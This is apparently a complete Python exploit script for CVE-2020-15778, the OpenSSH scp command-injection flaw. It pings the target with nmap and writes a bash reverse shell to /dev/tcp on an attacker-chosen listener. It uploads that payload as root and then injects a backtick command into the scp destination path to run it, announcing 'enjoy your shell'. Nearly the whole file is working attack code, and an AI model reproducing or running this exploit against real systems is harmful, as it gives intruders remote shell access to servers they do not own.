﻿# --CVE-2020-15778-Exp--
# -*- Encoding: utf-8 -*-
# --Update Log: use nmap to check host status, if host is down, the script will exit
import os
import argparse
import sys
import nmap


def host():
    parser = argparse.ArgumentParser(description='Exp for CVE-2020-15778')
    parser.add_argument('-ip', required=True)
    parser.add_argument('-lhost', required=True)
    parser.add_argument('-lport', required=True)
    args = parser.parse_args()
    #print(args)
    return args


def exp(args):
    address = str(args.ip)
    print("[+]target host ip is: " + address)
    lhost = str(args.lhost)
    lport = str(args.lport)
    print("[+]input listener host: " + lhost)
    print("[+]input listener Port: " + lport)
    nm = nmap.PortScanner()
    result = nm.scan(hosts=address, arguments='-sn')
    result2 = str(result['scan'])
    #print("value is: " + result2)
    #print(result)
    if result2 == "{}":
        print("[-]host timeout ")
        print("[*]please check your ip address")
        sys.exit(0)
    shellcode = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1"
    #print(payload)
    try:
        f = open('shell.sh', mode='w')
        f.write(shellcode)
        f.close()
        print("[+]shellcode generate successful")
        f = open('test.txt', mode='w')
        f.write("123456")
        f.close()
    except:
        print("[-]shellcode generate unsuccessful")
        sys.exit(0)
    cmd1 = "scp shell.sh root@" + address + ":" + "/tmp/shell.sh"
    #print(cmd1)
    cmd2 = "scp test.txt root@" + address + ":" + "'`sh /tmp/shell.sh` /tmp/test.txt'"
    #print(cmd2)
    os.system(cmd1)
    print("[+]backdoor transport successful")
    print("[+]payload is ready")
    print("[+]please use netcat to listen reverse shell")
    os.system(cmd2)
    print("[*]input the password in second time")
    print("[*]waiting for get shell......")
    print("[+]enjoy your shell")

def check(url, ip, ports):
    return None;

'''
if __name__ == '__main__':
    exp(host())
'''